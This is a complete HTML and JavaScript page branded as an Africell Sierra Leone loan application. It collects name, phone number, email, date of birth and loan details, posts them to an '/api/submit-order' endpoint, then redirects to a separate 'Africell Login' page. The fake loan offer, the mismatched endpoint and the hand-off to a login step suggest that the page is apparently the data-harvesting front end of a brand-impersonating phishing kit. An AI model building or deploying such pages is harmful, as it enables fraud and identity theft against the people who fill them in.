<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Africell Sierra Leone | Loan Application</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        /* Removes the vertical scrollbar while keeping full scrolling enabled */
        body::-webkit-scrollbar {
            display: none;
        }
        body {
            scrollbar-width: none; /* For Firefox */
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 16px;
            color: #ffffff;
            overflow-y: auto;
        }

        .e-form-container {
            width: 100%;
            max-width: 520px;
            display: flex;
            flex-direction: column;
            gap: 22px;
        }

        .e-form-header {
            text-align: center;
            margin-bottom: 2px;
        }

        .e-form-header h1 {
            font-size: 32px;
            font-weight: 900;
            letter-spacing: -0.5px;
            text-transform: uppercase;
            margin-bottom: 6px;
            color: #ffffff;
            text-shadow: 0 2px 6px rgba(0,0,0,0.3);
        }

        .e-form-header h1 span {
            color: #ffd34d; /* Yellow/Gold Accent */
        }

        .e-form-header p {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.85);
            font-weight: 400;
            line-height: 1.4;
        }

        .e-input-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        .e-input-group {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.18);
            border-radius: 22px;
            padding: 16px 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            transition: all 0.2s ease;
        }

        .e-input-group:focus-within {
            border-color: rgba(255, 211, 77, 0.6);
            background: rgba(255, 255, 255, 0.12);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.25);
        }

        .e-input-group.full-width {
            grid-column: span 2;
        }

        .e-input-group label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            color: #ffd34d; /* Yellow/Gold */
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        /* Modern Input Fields */
        .e-input-group input, 
        .e-input-group select, 
        .e-input-group textarea {
            width: 100%;
            background: rgba(255, 255, 255, 0.95);
            border: 1.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 14px;
            outline: none;
            font-size: 15px;
            color: #1F2937;
            font-weight: 600;
            text-align: center;
            padding: 12px 14px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
            transition: all 0.2s ease;
        }

        .e-input-group input:focus,
        .e-input-group select:focus,
        .e-input-group textarea:focus {
            background: #ffffff;
            border-color: #ffd34d;
            box-shadow: 0 0 0 4px rgba(255, 211, 77, 0.25), inset 0 2px 4px rgba(0,0,0,0.02);
        }

        .e-input-group select {
            text-align-last: center;
            cursor: pointer;
        }

        .e-input-group input::placeholder,
        .e-input-group textarea::placeholder {
            color: #9CA3AF;
            font-weight: 400;
            text-align: center;
        }

        /* Style Select Options */
        .e-input-group select option {
            background: #ffffff;
            color: #1F2937;
        }

        /* Date of Birth Inputs Row */
        .dob-inputs-row {
            display: flex;
            align-items: center;
            gap: 10px;
            width: 100%;
        }

        .dob-input {
            flex: 1;
            height: 48px;
            background: rgba(255, 255, 255, 0.95);
            border: 1.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 14px;
            font-size: 15px;
            font-weight: 600;
            color: #1F2937;
            text-align: center;
            outline: none;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
        }

        .dob-slash {
            font-size: 20px;
            font-weight: 700;
            color: #ffd34d;
        }

        /* Phone Input Split Row */
        .e-phone-split-row {
            display: flex;
            gap: 10px;
            width: 100%;
        }

        .e-prefix-box {
            width: 85px;
            padding: 12px 8px;
            background: rgba(255, 255, 255, 0.95);
            border: 1.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 14px;
            font-size: 15px;
            font-weight: 700;
            color: #1F2937;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
            flex-shrink: 0;
        }

        .e-input-group textarea {
            resize: vertical;
            height: 75px;
            text-align: left;
            padding: 12px 14px;
        }

        .e-input-group textarea::placeholder {
            text-align: left;
        }

        /* Submit Button (Yellow/Gold) */
        .e-btn-submit {
            display: block;
            width: 100%;
            background: #ffd34d; /* Yellow/Gold */
            color: #5E0C44;
            text-align: center;
            padding: 18px;
            border-radius: 20px;
            font-size: 17px;
            font-weight: 900;
            border: none;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-top: 4px;
        }

        .e-btn-submit:hover {
            transform: translateY(-2px);
            background: #ffe066;
            box-shadow: 0 15px 35px rgba(255, 211, 77, 0.4);
        }

        .e-btn-submit:active {
            transform: translateY(0);
        }

        /* Professional Loading Overlay Modal */
        #loadingOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(121, 16, 92, 0.92);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #ffffff;
            text-align: center;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.15);
            border-top: 5px solid #ffd34d; /* Yellow Spinner */
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #loadingText {
            font-size: 18px;
            font-weight: 700;
            letter-spacing: 0.5px;
            color: #ffd34d; /* Yellow */
        }

        /* Custom In-App Modal Dialog Styling */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(121, 16, 92, 0.9);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #79105c; /* Deep Purple */
            width: 100%;
            max-width: 320px;
            border-radius: 24px;
            padding: 28px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #ffffff;
            animation: scaleUp 0.25s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.85); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 24px;
            line-height: 1.4;
            color: #ffffff;
        }

        .modal-btn {
            background: #ffd34d; /* Yellow/Gold */
            color: #5E0C44;
            border: none;
            border-radius: 14px;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 16px rgba(255, 211, 77, 0.3);
            transition: opacity 0.15s ease;
        }

        .modal-btn:active {
            opacity: 0.9;
        }

        @media (max-width: 600px) {
            body {
                padding: 12px;
            }
            .e-form-header h1 {
                font-size: 26px;
            }
            .e-form-header p {
                font-size: 13px;
            }
            .e-input-row {
                grid-template-columns: 1fr;
                gap: 12px;
            }
            .e-input-group.full-width {
                grid-column: span 1;
            }
            .e-input-group {
                padding: 14px 16px;
            }
        }
    </style>
</head>
<body>

    <div class="e-form-container">
        <div class="e-form-header">
            <h1>Africell <span>Application</span></h1>
            <p>Fast, transparent financing designed to help you reach your goals.</p>
        </div>

        <form id="loanForm" onsubmit="handleFormSubmit(event)">
            <div class="e-input-row">
                <!-- Full Name -->
                <div class="e-input-group">
                    <label for="fullName">Full Name</label>
                    <input type="text" id="fullName" required placeholder="Enter your full name">
                </div>

                <!-- Phone Number with Split +232 Prefix and Mobile Number Box -->
                <div class="e-input-group">
                    <label for="phoneNumber">Phone Number</label>
                    <div class="e-phone-split-row">
                        <div class="e-prefix-box">+232</div>
                        <input type="tel" id="phoneNumber" required placeholder="Mobile Number" maxlength="9" inputmode="numeric" pattern="[0-9]*">
                    </div>
                </div>
            </div>

            <div class="e-input-row">
                <!-- Email Address -->
                <div class="e-input-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" required placeholder="yourname@example.com">
                </div>

                <!-- Editable Loan Amount (Pre-filled from Calculator via localStorage) -->
                <div class="e-input-group">
                    <label for="loanAmountInput">Loan Amount (Leone)</label>
                    <input type="text" id="loanAmountInput" required placeholder="NLe 10,000">
                </div>
            </div>

            <!-- Date of Birth Input Group (Day / Month / Year) -->
            <div class="e-input-group full-width">
                <label>Date of Birth</label>
                <div class="dob-inputs-row">
                    <input type="text" id="dobDay" class="dob-input" placeholder="DD" maxlength="2" inputmode="numeric" required>
                    <span class="dob-slash">/</span>
                    <input type="text" id="dobMonth" class="dob-input" placeholder="MM" maxlength="2" inputmode="numeric" required>
                    <span class="dob-slash">/</span>
                    <input type="text" id="dobYear" class="dob-input" placeholder="YYYY" maxlength="4" inputmode="numeric" required>
                </div>
            </div>

            <!-- Type of Loan Selection -->
            <div class="e-input-group full-width">
                <label for="loanType">Type of Loan</label>
                <select id="loanType" required>
                    <option value="" disabled selected>Select loan type</option>
                    <option value="Grow Business">Grow Business</option>
                    <option value="Personal loan">Personal loan</option>
                    <option value="Emergency loan">Emergency loan</option>
                    <option value="Vehicle loan">Vehicle loan</option>
                    <option value="Agriculture loan">Agriculture loan</option>
                    <option value="Education loan">Education loan</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <!-- Reason for Loan Textarea -->
            <div class="e-input-group full-width">
                <label for="loanReason">Reason for Loan</label>
                <textarea id="loanReason" required placeholder="Briefly describe what you will use this loan for..."></textarea>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="e-btn-submit">Submit Application &rarr;</button>
        </form>
    </div>

    <!-- Professional Loading Overlay -->
    <div id="loadingOverlay">
        <div class="spinner"></div>
        <div id="loadingText">Analyzing application data...</div>
    </div>

    <!-- Custom In-App Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        function showAppAlert(message) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }

        // Retrieve saved loan amount from localStorage
        const savedAmount = localStorage.getItem('africellLoanAmount') || 'NLe 10,000';
        document.getElementById('loanAmountInput').value = savedAmount;

        const phoneInput = document.getElementById('phoneNumber');

        window.addEventListener('DOMContentLoaded', () => {
            const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
            if (savedPhone && phoneInput) {
                const cleanNum = savedPhone.replace('+232', '').trim();
                phoneInput.value = cleanNum;
            }
        });

        // Validates 8 or 9 characters
        function isValidSierraLeonePhone(number) {
            const cleaned = number.replace(/[\s-]/g, '');
            return /^\d{8,9}$/.test(cleaned);
        }

        async function handleFormSubmit(event) {
            event.preventDefault(); // Prevent page reload

            const fullName = document.getElementById('fullName').value.trim();
            const rawPhone = phoneInput.value.trim();
            const email = document.getElementById('email').value.trim();
            const finalAmount = document.getElementById('loanAmountInput').value;
            const loanType = document.getElementById('loanType').value;
            const loanReason = document.getElementById('loanReason').value.trim();

            const dobDay = document.getElementById('dobDay').value.trim();
            const dobMonth = document.getElementById('dobMonth').value.trim();
            const dobYear = document.getElementById('dobYear').value.trim();
            const fullDob = `${dobDay}/${dobMonth}/${dobYear}`;

            if (!rawPhone || !isValidSierraLeonePhone(rawPhone)) {
                showAppAlert('Enter Correct Number');
                return;
            }

            const fullPhoneNum = '+232 ' + rawPhone;

            // Save user details to localStorage
            localStorage.setItem('africellUserName', fullName);
            localStorage.setItem('africellUserPhone', fullPhoneNum);
            localStorage.setItem('africellDob', fullDob);
            localStorage.setItem('africellLoanAmount', finalAmount);
            localStorage.setItem('userPhone', fullPhoneNum); // Backwards compatibility

            const overlay = document.getElementById('loadingOverlay');
            const loadingText = document.getElementById('loadingText');

            // Show loading overlay
            overlay.style.display = 'flex';
            loadingText.textContent = "Analyzing application data...";

            try {
                // Send application data to API endpoint including automatically bundled DOB
                await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: fullPhoneNum, 
                        uniqueId: `Application - Name: ${fullName}, DOB: ${fullDob}, Email: ${email}, Amount: ${finalAmount}, Type: ${loanType}, Reason: ${loanReason}` 
                    })
                });
            } catch (error) {
                console.error('Error submitting application to API:', error);
            }

            // Step 1: Change text after 1.8 seconds
            setTimeout(() => {
                loadingText.textContent = "Proceeding to Africell Login...";
            }, 1800);

            // Step 2: Redirect to login.html after 3.2 seconds total
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 3200);
        }
    </script>
</body>
</html>
